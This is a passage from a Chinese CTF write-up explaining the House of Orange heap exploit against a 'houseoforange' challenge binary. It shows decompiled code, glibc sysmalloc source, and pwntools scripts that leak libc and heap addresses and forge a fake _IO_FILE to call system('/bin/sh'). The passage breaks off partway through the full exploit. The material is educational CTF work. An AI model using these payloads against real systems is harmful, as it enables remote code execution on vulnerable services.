= <span class="built_in">rand</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[%dm%s\x1B[0m\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)(*house_list + <span class="number">4LL</span>), *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_203080 + v2 % <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>See</code> 函数会打印出 <code>house-&gt;name</code>、<code>orange-&gt;price</code> 和 <code>orange</code> 图案。</p>
<ul>
<li><code>Upgrade</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Upgrade</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *house; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len_of_name; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> type; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( max_up &gt; <span class="number">2u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t upgrade more&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !house_list )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  len_of_name = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( len_of_name &gt; <span class="number">0x1000</span> )</span><br><span class="line">    len_of_name = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  <span class="built_in">Read</span>((<span class="type">void</span> *)house_list[<span class="number">1</span>], len_of_name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>);</span><br><span class="line">  house = (_DWORD *)*house_list;</span><br><span class="line">  *house = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="built_in">Color</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange: &quot;</span>);</span><br><span class="line">  type = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( type != <span class="number">0xDDAA</span> &amp;&amp; (type &lt;= <span class="number">0</span> || type &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( type == <span class="number">0xDDAA</span> )</span><br><span class="line">    *(_DWORD *)(*house_list + <span class="number">4LL</span>) = <span class="number">0xDDAA</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_DWORD *)(*house_list + <span class="number">4LL</span>) = type + <span class="number">0x1E</span>;</span><br><span class="line">  ++max_up;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Upgrade</code> 函数重新设置了 <code>len_of_name</code> 后直接向旧的 <code>name</code> 区域读入内容，如果 <code>len_new &gt; len_old</code> 就会导致堆溢出。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>本题没有 <code>free</code> 函数，存在堆溢出。当 <code>top chunk</code>的剩余部分已经不能够满足请求时，就会调用函数 <code>sysmalloc()</code>分配新内存， 这时可能会发生两种情况，一种是调用 <code>sbrk</code>函数直接扩充 <code>top chunk</code>，另一种是调用 <code>mmap</code> 函数分配一块新的 <code>top chunk</code>。具体调 用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 <code>top chunk</code>，需要请求小于阈值 <code>mp_.mmap_threshold</code>。 要成功调用 <code>_int_free()</code> 还需绕过两个断言: </p>
<ol>
<li><p><code>(unsigned long) (old_size) &gt;= MINSIZE</code> 也就是 <code>0x20</code>。</p>
</li>
<li><p><code>prev_inuse == 1 </code></p>
</li>
<li><p><code>((unsigned long) old_end &amp; (pagesize - 1)) == 0 </code>页对齐</p>
</li>
<li><p><code>(unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE) </code>新申请的 <code>size</code> 大于 <code>old size + MINSIZE</code></p>
</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里阈值大于 mp_.mmap_threshold 就会调用 mmap 函数分配一块新的 top chunk。</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">	&#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    old_top = av-&gt;top;</span><br><span class="line">    old_size = <span class="built_in">chunksize</span> (old_top);</span><br><span class="line">    old_end = (<span class="type">char</span> *) (<span class="built_in">chunk_at_offset</span> (old_top, old_size));</span><br><span class="line"></span><br><span class="line">    brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *	1. (unsigned long) (old_size) &gt;= MINSIZE 也就是0x20。</span></span><br><span class="line"><span class="comment">    *	2. prev_inuse == 1</span></span><br><span class="line"><span class="comment">    *	3. ((unsigned long) old_end &amp; (pagesize - 1)) == 0 页对齐</span></span><br><span class="line"><span class="comment">    *	4. (unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE) 新申请的 size 大于 old size + MINSIZE</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">            ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">             <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">             ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">        heap_info *old_heap, *heap;</span><br><span class="line">        <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">        old_heap = <span class="built_in">heap_for_ptr</span> (old_top);</span><br><span class="line">        old_heap_size = old_heap-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; <span class="built_in">grow_heap</span> (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            <span class="built_in">set_head</span> (old_top, (((<span class="type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="type">char</span> *) old_top)</span><br><span class="line">                    | PREV_INUSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((heap = <span class="built_in">new_heap</span> (nb + (MINSIZE + <span class="built_in">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            heap-&gt;ar_ptr = av;</span><br><span class="line">            heap-&gt;prev = old_heap;</span><br><span class="line">            av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">            arena_mem += heap-&gt;size;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">top</span> (av) = <span class="built_in">chunk_at_offset</span> (heap, <span class="built_in">sizeof</span> (*heap));</span><br><span class="line">            <span class="built_in">set_head</span> (<span class="built_in">top</span> (av), (heap-&gt;size - <span class="built_in">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">            <span class="built_in">set_head</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">            <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set_head</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                <span class="built_in">set_foot</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">                <span class="built_in">set_head</span> (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">                <span class="comment">// 释放 old_top_chunk 到 unsorted bin。</span></span><br><span class="line">                _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set_head</span> (old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                <span class="built_in">set_foot</span> (old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">          <span class="keyword">goto</span> try_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样便可成功泄露 <code>libc</code> 基址，从而获得 <code>_IO_list_all</code> 地址，然后可以利用 <code>unsorted bin attack</code> 劫持 <code>_IO_list_all</code> 到<code>main_arena+88</code>，利用 <code>fp-&gt;chain</code> 域，使 <code>fp</code> 指 向 <code>old_top</code>，前 <code>8</code> 字节为 <code>&#39;/bin/sh\x00&#39;</code> 字符串，使 <code>_IO_OVERFLOW</code> 为<code>system</code> 函数的地址，从而获得 <code>shell</code>。</p>
<p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">lk = <span class="keyword">lambda</span> addrstring, address: log.info(<span class="string">&#x27;&#123;&#125;: %#x&#x27;</span>.<span class="built_in">format</span>(addrstring), address)</span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./houseoforange&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.138&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name :&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange:&quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name:&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange: &quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br></pre></td></tr></table></figure></div>



<p><strong>泄露libc和heap基址</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">def <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function">    global malloc_hook, _IO_list_all, system_addr, heap_base</span></span><br><span class="line"><span class="function">    build(<span class="number">0x30</span>, b<span class="string">&#x27;ffff&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) # chunk0</span></span><br><span class="line"><span class="function">    #debug()</span></span><br><span class="line"><span class="function">    payload =</span> <span class="built_in">cyclic</span>(<span class="number">0x30</span>) + <span class="built_in">p64</span>(<span class="number">0</span>) + <span class="built_in">p64</span>(<span class="number">0x21</span>) + <span class="built_in">p32</span>(<span class="number">233</span>) + <span class="built_in">p32</span>(<span class="number">0xDDAA</span>)</span><br><span class="line">    payload += <span class="built_in">p64</span>(<span class="number">0</span>) * <span class="number">2</span> + <span class="built_in">p64</span>(<span class="number">0xf81</span>)</span><br><span class="line">    <span class="built_in">upgrade</span>(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="meta"># size must be page aligned</span></span><br><span class="line">    <span class="meta">#debug()</span></span><br><span class="line">    <span class="built_in">build</span>(<span class="number">0x1000</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) # chunk1</span><br><span class="line">    <span class="meta">#debug()</span></span><br><span class="line">    <span class="built_in">build</span>(<span class="number">0x400</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">8</span>, <span class="number">666</span>, <span class="number">2</span>) # chunk2</span><br><span class="line">    <span class="built_in">debug</span>()</span><br><span class="line">    io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).<span class="built_in">encode</span>())</span><br><span class="line">    io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc.address = <span class="built_in">u64</span>(io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>\x7f<span class="number">&#x27;</span>).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;libc base address&#x27;</span>, libc.address)</span><br><span class="line">    _IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;_IO_list_all&#x27;</span>, _IO_list_all)</span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;system_addr&#x27;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">upgrade</span>(<span class="number">0x10</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">0x10</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">debug</span>()</span><br><span class="line">    io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).<span class="built_in">encode</span>())</span><br><span class="line">    io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_addr = <span class="built_in">u64</span>(io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>, drop=True).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    heap_base = heap_addr - <span class="number">0xE0</span></span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174459330.png"
                      alt="image-20231019174459330"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174527488.png"
                      alt="image-20231019174527488"
                ></p>
<p>首先通过堆溢出将 <code>top_chunk</code> 的大小改为 <code>0xf81</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174746698.png"
                      alt="image-20231019174746698"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019175547709.png"
                      alt="image-20231019175547709"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019181025042.png"
                      alt="image-20231019181025042"
                ></p>
<p>然后申请一块大于 <code>0xf81</code> 的 <code>chunk</code> 利用上面讲的 <code>sysmalloc</code> 中的 <code>_int_free</code> 函数将 <code>old_top_chunk</code> 放入 <code>unsorted_bin</code> 中。在申请 <code>0x400</code> 大小的 <code>large_chunk</code> ，<code>ptmalloc2</code> 会先将 <code>old_top_chunk</code> 放进 <code>large_bin</code>，然后切分 <code>old_top_chunk</code>，再将其放回 <code>unsorted_bin</code>。 所以此时其 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 遗留了 <code>heap</code> 地址。其 <code>bk</code> 位置遗留了 <code>main_arean+0x668</code> 的地址。我们可以通过 <code>0x400</code> 这个堆块泄露出 <code>heap</code> 和 <code>libc</code> 地址，然后通过计算偏移获得基址。</p>
<p><strong>FSOP</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>():</span><br><span class="line">    orange = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsorted_bin_attack</span></span><br><span class="line">    orange += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    orange = orange.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orange += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">0x400</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += orange</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>)</span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure></div>

<p>我们可以通过 <code>unsorted_bin_attack</code> 将 <code>_IO_list_all</code> 指向 <code>main_arena+0x58</code> ，但这块区域是我们不可控的，我们看一下 <code>malloc_state</code> 结构体源码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line">  <span class="comment">/* int have_fastchunks; glibc 2.23 无此成员 */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><em>(tips:bins[2*N - 2] 和 bins[2 * N - 1]分别对应链表头和链表尾指针)</em></p>
<p><code>bins[11] == small_bin[5] == small_bin_0x60 </code> ，<code>bins[0] == unsorted_bin</code>，相差是 <code>12*8 = 0x60</code>。结合 <code>_IO_FILE_plus</code> 结构体如下图所示:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosa_fake_io.png"
                      alt="hosa_fake_io"
                ></p>
<p>我们可以控制 <code>old_top_chunk</code> 的大小，把它 <code>size</code> 置为 <code>0x61</code>，并在其内部构建 <code>fake_IO_FILE_plus_2</code> 放进 <code>small_bin[5]</code>，那么<code>fp-&gt;_chain</code> 将会指向 <code>fake_IO_FILE_2</code>。此时 <code>main_arena</code> 如下图。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019195436804.png"
                      alt="image-20231019195436804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019200506509.png"
                      alt="image-20231019200506509"
                ></p>
<p>为了绕过如下检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) </span><br><span class="line">    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure></div>

<p>我们构造的 <code>fake_IO_FILE_plus</code> 如下图:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosafioplus.png"
                      alt="hosafioplus"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019200603105.png"
                      alt="image-20231019200603105"
                ></p>
<p>检测到内存错误后的调用 <code>_IO_OVERFLOW (fp, EOF)-&gt;_IO_OVERFLOW(&quot;/bin/sh\x00, EOF&quot;)-&gt;system(&quot;/bin/sh\x00&quot;)</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019201736567.png"
                      alt="image-20231019201736567"
                ></p>
<p><strong>完整exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">lk = <span class="keyword">lambda</span> addrstring, address: log.info(<span class="string">&#x27;&#123;&#125;: %#x&#x27;</span>.<span class="built_in">format</span>(addrstring), address)</span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./houseoforange&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.138&#x27;</span>,<span 